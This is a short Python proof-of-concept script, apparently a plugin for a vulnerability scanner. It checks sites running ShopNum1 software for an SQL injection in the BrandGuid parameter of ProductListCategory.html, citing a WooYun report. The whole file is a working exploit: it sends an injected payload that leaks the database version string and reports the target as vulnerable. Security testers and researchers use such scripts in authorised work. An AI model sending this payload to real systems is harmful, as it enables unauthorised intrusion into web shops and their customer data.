#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shopnum1 ProductListCategory SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0118352
author: Lucifer
description: 文件ProductListCategory.html中,参数BrandGuid存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class shopnum_ProductListCategory_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ProductListCategory.html?BrandGuid=ac69ddd9-3900-43b0-939b-3b1d438ca190%27AnD(ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsiOn)%3E0--"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在shopnum1 ProductListCategory SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "shopnum1 ProductListCategory SQL注入", str(payload), req.text
            else:
                cprint("[-]不存在shopnum_ProductListCategory_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = shopnum_ProductListCategory_sqli_BaseVerify(sys.argv[1])
    testVuln.run()